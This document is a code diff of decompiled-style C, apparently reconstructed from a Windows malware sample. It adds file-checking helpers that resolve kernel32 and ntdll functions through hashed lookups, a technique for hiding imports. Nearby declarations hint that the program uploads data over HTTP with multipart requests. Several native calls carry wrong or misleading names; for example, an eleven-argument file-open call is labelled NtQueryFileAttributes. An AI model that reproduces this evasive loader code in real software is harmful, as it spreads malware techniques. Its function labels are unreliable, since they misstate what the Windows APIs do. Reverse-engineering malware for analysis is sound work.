@@ -14,7 +14,7 @@ size_t __cdecl
 ProcessMultipartRequest(void *dataToSend, size_t dataSize, size_t *bufferSize, PSTR IPaddrs);
 
 PSTR __fastcall 
-ProccessingOrMapsTheWideCharacter(wchar16* lpWideCharStr){
+ProccessingOrMapsTheWideCharacter(wchar16* lpWideCharStr)
 {
         if (lpWideCharStr)
         // after searching for WideCharToMultiByte in msdn :
@@ -60,6 +60,71 @@ ProccessingOrMapsTheWideCharacter(wchar16* lpWideCharStr){
         return nullptr;
 }
 
+int __thiscall 
+checkFileStatus(WCHAR *TheRealOne)
+{
+    const WCHAR *resolvedPath;
+    void (__stdcall *GetFullPathNameW)(void *, const WCHAR *, int);
+    WCHAR *__TheRealOne__;
+    __int16 pathLength;
+    int (__stdcall *NtQueryFileAttributes)(int *, int, _DWORD *, void *, _DWORD, int, int, int, int, _DWORD, _DWORD);
+    int res_OftheChecks;
+    int __res_OftheChecks__;
+    void (__stdcall *NtCleanup)(int);
+    int result;
+
+    resolvedPath = (const WCHAR *)calloc(260, 2);
+    GetFullPathNameW = (void (__stdcall *)(void *, const WCHAR *, int))ResolveTheHash(1932064005, (int)L"kernel32.dll");
+    GetFullPathNameW(TheRealOne, resolvedPath, 260);
+
+    res_OftheChecks = 0;
+    __TheRealOne__ = (WCHAR *)calloc(280, 2);
+    lstrcatW(__TheRealOne__, L"\\??\\");
+    lstrcatW(__TheRealOne__, resolvedPath);
+
+    _DWORD *Checkskiddi__TheRealOne__file = calloc(8, 1);
+    _DWORD *fileCheckStruct = calloc(24, 1);
+    fileCheckStruct[1] = 0;
+    fileCheckStruct[4] = 0;
+    fileCheckStruct[5] = 0;
+    fileCheckStruct[0] = 24;
+    fileCheckStruct[3] = 64; 
+    fileCheckStruct[2] = Checkskiddi__TheRealOne__file;
+    Checkskiddi__TheRealOne__file[0] = 2 * lstrlenW(__TheRealOne__);
+    pathLength = lstrlenW(__TheRealOne__);
+    Checkskiddi__TheRealOne__file[1] = __TheRealOne__;
+    Checkskiddi__TheRealOne__file[2] = 2 * pathLength + 2;
+
+    NtQueryFileAttributes = (int (__stdcall *)(int *, int, _DWORD *, void *, _DWORD, int, int, int, int, _DWORD, _DWORD))ResolveTheHash(-1245012160, (int)L"ntdll.dll");
+    res_OftheChecks = NtQueryFileAttributes(&__res_OftheChecks__, 1179785, fileCheckStruct, Checkskiddi__TheRealOne__file, 0, 128, 3, 1, 32, 0, 0);
+
+    NtCleanup = (void (__stdcall *)(int))ResolveTheHash(2009039007, (int)L"ntdll.dll");
+    NtCleanup(res_OftheChecks);
+
+    result = __res_OftheChecks__;
+    if (res_OftheChecks < 0)
+        return 0;
+
+    return result;
+}
+
+int 
+verifyFileStatus(WCHAR *TheRealOne)
+{
+    int result;
+    void (__stdcall *NtQueryAttributesFile)(int);
+    int result__;
+
+    result = checkFileStatus(TheRealOne);
+    if (!result)
+        return result;
+
+    result__ = result;
+
+    NtQueryAttributesFile = (void (__stdcall *)(int))ResolveTheHash(-293473983, (int)L"ntdll.dll");
+    NtQueryAttributesFile(result__);
+
+    return 1;
 }
 
 int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraParam);
